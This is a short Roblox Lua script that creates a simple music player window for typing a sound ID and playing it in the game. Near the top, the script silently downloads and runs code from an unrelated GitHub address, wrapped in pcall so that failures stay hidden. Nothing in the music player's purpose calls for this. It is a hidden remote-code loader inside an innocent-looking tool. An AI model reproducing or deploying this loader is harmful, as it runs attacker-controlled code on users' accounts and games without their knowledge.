local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/beeryouion-star/c00kahai/refs/heads/main/Morning%20w", true))()
end)

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MusicGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 250, 0, 150)
frame.Position = UDim2.new(0.5, -125, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0,0,0,0)
title.BackgroundTransparency = 1
title.Text = "🎵 Music Player"
title.TextColor3 = Color3.fromRGB(255,255,255)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 18
title.Parent = frame

local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(1, -20, 0, 30)
textBox.Position = UDim2.new(0,10,0,40)
textBox.PlaceholderText = "ใส่ Music ID"
textBox.ClearTextOnFocus = false
textBox.Text = ""
textBox.TextColor3 = Color3.fromRGB(255,255,255)
textBox.BackgroundColor3 = Color3.fromRGB(50,50,50)
textBox.BorderSizePixel = 0
textBox.Parent = frame

local playButton = Instance.new("TextButton")
playButton.Size = UDim2.new(1, -20, 0, 30)
playButton.Position = UDim2.new(0,10,0,80)
playButton.BackgroundColor3 = Color3.fromRGB(70,130,180)
playButton.Text = "▶️ Play"
playButton.TextColor3 = Color3.fromRGB(255,255,255)
playButton.Font = Enum.Font.SourceSansBold
playButton.TextSize = 18
playButton.BorderSizePixel = 0
playButton.Parent = frame

local function playMusic(id)
    if not id or id == "" then return end
    for _, v in pairs(workspace:GetChildren()) do
        if v:IsA("Sound") and v.Name == "GlobalMusic" then
            v:Stop()
            v:Destroy()
        end
    end
    local sound = Instance.new("Sound")
    sound.Name = "GlobalMusic"
    sound.SoundId = "rbxassetid://"..id
    sound.Looped = true
    sound.Volume = 1
    sound.Parent = workspace
    sound:Play()
end

playButton.MouseButton1Click:Connect(function()
    local musicId = textBox.Text
    playMusic(musicId)
end)
